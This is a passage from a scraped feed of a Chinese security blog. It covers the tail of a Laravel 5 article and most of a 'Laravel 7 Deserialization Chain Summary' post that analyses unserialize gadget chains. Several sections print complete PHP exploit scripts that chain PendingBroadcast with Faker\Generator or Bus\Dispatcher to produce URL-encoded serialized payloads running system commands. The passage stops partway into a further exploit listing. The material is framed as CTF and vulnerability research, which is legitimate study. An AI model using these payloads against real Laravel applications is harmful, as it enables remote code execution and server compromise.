class="keyword">$this</span>-&gt;disconnect()</span><br></pre></td></tr></table></figure></p><p>除此之外，还有一些在__destruct中出现频率不高的，如果感兴趣的都可以跟进进行尝试构造。</p><h2 id="this-gt-xxx-gt-yyy-调用形式"><a href="#this-gt-xxx-gt-yyy-调用形式" class="headerlink" title="$this-&gt;xxx-&gt;yyy()调用形式"></a>$this-&gt;xxx-&gt;yyy()调用形式</h2><p>而对于这种调用形式，我们在之前的文章中提到过，其有2种思路进行利用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__call魔法方法</span><br><span class="line">同名函数</span><br></pre></td></tr></table></figure></p><p>我们看几个典型的例子：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Illuminate\Broadcasting\PendingBroadcast::__destruct</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>此处由于$this-&gt;events和$this-&gt;event均可控，因此可利用同名函数或__call的方式进行RCE pop chain的构造。<br>除此之外：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Symfony\Component\Routing\Loader\Configurator\ImportConfigurator::__destruct</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;parent-&gt;addCollection(<span class="keyword">$this</span>-&gt;route);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>同样有着相似的问题，虽然可能没有同名危险函数，但可以利用__call来进行构造，配合Faker\Generator来构造RCE pop chain。<br>并且如下类也存在类似的问题：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Symfony\Component\Routing\Loader\Configurator\CollectionConfigurator::__destruct</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">null</span> === <span class="keyword">$this</span>-&gt;prefixes) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;collection-&gt;addPrefix(<span class="keyword">$this</span>-&gt;route-&gt;getPath());</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;parent-&gt;addCollection(<span class="keyword">$this</span>-&gt;collection);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>相应的，其实我们在构造同名函数RCE pop chain的时候其实还算好，但当构造__call的时候，由于call name一般不可控，毕竟Faker\Generator中name可通过数组控制的情况不算特别多，那么此时可能会遇到瓶颈。<br>所以这种形式的利用手段并不是想象中那么丝滑（，还是需要精心构造的。</p><h2 id="built-in函数"><a href="#built-in函数" class="headerlink" title="built-in函数"></a>built-in函数</h2><p>此类情况一般偏少，我们将搜寻锁定在敏感函数上，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func、call_user_func_array、system、eval......</span><br></pre></td></tr></table></figure></p><p>这里不难直接发现一个类：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GuzzleHttp\Psr7\FnStream::__destruct</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_fn_close)) &#123;</span><br><span class="line">        call_user_func(<span class="keyword">$this</span>-&gt;_fn_close);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们发现其直接调用了call_user_func，同时参数可控，为 $this-&gt;_fn_close，但难点在于该函数只可控第一个参数，因此这里我们可以想到能否调用类内方法，如果该方法不需传递参数且方法内敏感函数参数可控，为类内属性，那么即可利用。<br>这里不难想到，诸如：Illuminate\Foundation\Testing\PendingCommand的run方法，Illuminate\Routing\PendingResourceRegistration的register方法，都是可以通过其进行利用的。<br>当然这会显得有些取巧，如果你有兴趣的话，可以过一遍危险函数所在的方法，看看是不是其可以无参调用~<br>但是不幸的是，当前这个例子中，我们跟进类进行分析：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> \LogicException(<span class="string">'FnStream should never be unserialized'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>由于存在<strong>wakeup，我们在利用这个chain的时候会抛出’FnStream should never be unserialized’的错误，而导致无法利用。<br>当然，我们也可以不仅仅找</strong>destruct函数内的危险函数，尝试搜寻一些危险函数所在的方法和类，不难找到如下几个情况：PHPUnit\Framework\MockObject\Stub\ReturnCallback::invoke，关键代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">invoke</span><span class="params">(Invocation $invocation)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> \call_user_func_array(<span class="keyword">$this</span>-&gt;callback, $invocation-&gt;getParameters());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>又如Mockery\Loader\EvalLoader::load，关键代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span><span class="params">(MockDefinition $definition)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (class_exists($definition-&gt;getClassName(), <span class="keyword">false</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"?&gt;"</span> . $definition-&gt;getCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>诸如此类情况，我们都可以将其整合进call_user_func或者call_user_func_array可控2个参数的地方，例如和Illuminate\Broadcasting\PendingBroadcast::__destruct组合，构造新的chain。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>Laravel 5由于过滤相对于Laravel 7来说缺失了一些，因此更容易被组建pop chain，同时laravel由于提供了大量的可用于构造的模块，也会衍生出各种排列组合的pop chain，但万变不离其中，最关键的还是寻找切入点。<br>本文提出的一些寻找pop chain的思路也是抛砖引玉，实际上寻找切入点的方式远远不止__destruct和文中所提及的3种类型，如果你有好的想法也欢迎和我联系交流~<br>总之还是那句话，求求CTF里别再出laravel的pop chain构造了（ .</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Laravel 7中由于一些有所类修复，导致一些pop chain无法使用，于是这次在Laravel 5系列中，也做一次总结，列举比较适合的
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Laravel 7 Deserialization Chain Summary</title>
    <link href="http://skysec.top/2020/07/19/Laravel-Deserialization-Chain-Summary/"/>
    <id>http://skysec.top/2020/07/19/Laravel-Deserialization-Chain-Summary/</id>
    <published>2020-07-19T12:06:55.000Z</published>
    <updated>2020-07-21T01:55:15.557Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>晚上闲着无聊，想到real world和ctf里非常喜欢出题考察的laravel，于是下了个7系列版本分析着玩一玩，梳理了一下现阶段可用的一些exp。</p><h2 id="切入点"><a href="#切入点" class="headerlink" title="切入点"></a>切入点</h2><p>网上冲浪看到一篇blog讲laravel 5.8的漏洞，感觉挺有趣的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://nikoeurus.github.io/2019/12/16/laravel5.8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#Routes%E7%9B%AE%E5%BD%95</span><br></pre></td></tr></table></figure></p><p>文章提供了一个切入点，即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Illuminate\Broadcasting\PendingBroadcast::__destruct</span><br></pre></td></tr></table></figure></p><p>关键位置代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>我们看到在__destruct函数中使用通过$this-&gt;events调用了方法dispatch，参数为$this-&gt;event。<br>这一位置在最新版中依然存在，同时我们可以发现$this-&gt;events和$this-&gt;event均为可控点，那么可以玩的花样就比较多了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.通过dispatch + 可控$this-&gt;events 触发__call方法</span><br><span class="line">2.通过同名方法进行攻击</span><br></pre></td></tr></table></figure></p><h2 id="利用-call魔法方法"><a href="#利用-call魔法方法" class="headerlink" title="利用__call魔法方法"></a>利用__call魔法方法</h2><p>尝试搜寻一番__call魔法方法，发现一个切入点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Faker\Generator::__call</span><br></pre></td></tr></table></figure></p><p>关键代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $attributes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;format($method, $attributes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>跟进类内方法format：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span><span class="params">($formatter, $arguments = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;getFormatter($formatter), $arguments);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>此处比较开心的是，正好调用参数时，使用了类内方法getFormatter，我们查看该方法的关键内容：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span><span class="params">($formatter)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;formatters[$formatter])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[$formatter];</span><br><span class="line">        &#125;</span><br><span class="line">.......</span><br></pre></td></tr></table></figure></p><p>显然我们可以使用数组进行bypass，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$formatters[&apos;dispatch&apos;] = xxx</span><br><span class="line">```  </span><br><span class="line">如此一来即可任意RCE，我们编写exp：</span><br><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line">namespace Faker&#123;</span><br><span class="line">    class Generator&#123;</span><br><span class="line">        protected $formatters;</span><br><span class="line">        public function __construct($formatters)&#123;</span><br><span class="line">            $this-&gt;formatters = $formatters;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Illuminate\Broadcasting&#123;</span><br><span class="line">    class PendingBroadcast&#123;</span><br><span class="line">        protected $events;</span><br><span class="line">        protected $event;</span><br><span class="line">        public function __construct($event, $events)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;event = $event;</span><br><span class="line">            $this-&gt;events = $events;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line">    $a = new Faker\Generator(array(&apos;dispatch&apos; =&gt; &apos;system&apos;));</span><br><span class="line">    $b = new Illuminate\Broadcasting\PendingBroadcast(&apos;ls&apos;,$a);</span><br><span class="line">    echo urlencode(serialize($b));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h2 id="利用同名函数"><a href="#利用同名函数" class="headerlink" title="利用同名函数"></a>利用同名函数</h2><p>全局搜索哪些类有dispatch方法，可以定位到关键类：Illuminate\Bus\Dispatcher。<br>我们跟进其dispatch函数：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span><span class="params">($command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;queueResolver &amp;&amp; <span class="keyword">$this</span>-&gt;commandShouldBeQueued($command)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;dispatchToQueue($command);</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;dispatchNow($command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>跟进dispatchToQueue函数：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatchToQueue</span><span class="params">($command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $connection = $command-&gt;connection ?? <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    $queue = call_user_func(<span class="keyword">$this</span>-&gt;queueResolver, $connection);</span><br><span class="line">    .......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>不难发现有call_user_func，而此时$this-&gt;queueResolver和$connection均可控。<br>那么只要通过如下限制即可：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;queueResolver &amp;&amp; <span class="keyword">$this</span>-&gt;commandShouldBeQueued($command))</span><br></pre></td></tr></table></figure></p><p>我们跟进commandShouldBeQueued：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">commandShouldBeQueued</span><span class="params">($command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $command <span class="keyword">instanceof</span> ShouldQueue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现只要是继承ShouldQueue接口的类皆可。<br>这里随便搜一下，发现5个类均可用，编写exp如下:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> $event;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events=<span class="string">""</span>,$event=<span class="string">""</span>)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($queueResolver=<span class="string">""</span>)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queueResolver = $queueResolver;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Events</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CallQueuedListener</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">connection</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($connection=<span class="string">""</span>)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = $connection;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">BroadcastEvent</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">connection</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($connection=<span class="string">""</span>)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = $connection;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">QueuedCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">connection</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($connection=<span class="string">""</span>)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = $connection;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Notifications</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">SendQueuedNotifications</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">connection</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($connection=<span class="string">""</span>)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = $connection;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Queue</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CallQueuedClosure</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">connection</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($connection=<span class="string">""</span>)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = $connection;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $a = new Illuminate\Bus\Dispatcher('system');</span><br><span class="line">    $b = <span class="keyword">new</span> Illuminate\Events\CallQueuedListener(<span class="string">'ls'</span>);</span><br><span class="line"><span class="comment">//  $b = new Illuminate\Broadcasting\BroadcastEvent('ls');</span></span><br><span class="line"><span class="comment">//  $b = new Illuminate\Foundation\Console\QueuedCommand('ls');</span></span><br><span class="line"><span class="comment">//  $b = new Illuminate\Notifications\SendQueuedNotifications('ls');</span></span><br><span class="line"><span class="comment">//  $b = new Illuminate\Queue\CallQueuedClosure('ls');</span></span><br><span class="line">    $c = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($a,$b);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($c));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>这5个exp异曲同工，均可使用。</p><h2 id="举一反三-1"><a href="#举一反三-1" class="headerlink" title="举一反三(1)"></a>举一反三(1)</h2><p>那么对于诸如如上对象可控，对象调用方法参数可控的例子还有吗：<br>搜寻一番，可以发现关键类：Illuminate\Routing\PendingResourceRegistration<br>关键代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">$this</span>-&gt;registered) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;register();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>跟进类内方法register：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;registered = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;registrar-&gt;register(</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name, <span class="keyword">$this</span>-&gt;controller, <span class="keyword">$this</span>-&gt;options</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>此时我们发现：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;registered</span><br><span class="line"><span class="keyword">$this</span>-&gt;registrar</span><br><span class="line"><span class="keyword">$this</span>-&gt;name</span><br><span class="line"><span class="keyword">$this</span>-&gt;controller</span><br><span class="line"><span class="keyword">$this</span>-&gt;options</span><br></pre></td></tr></table></figure></p><p>均为可控点，因此我们又有2条路可走：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.使用__call魔法方法构造pop chain</span><br><span class="line">2.寻找register同名函数构造pop chain</span><br></pre></td></tr></table></figure></p><p>对于1的情况，其实直接复用之前的Faker\Generator类即可，我们很容易写出exp：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 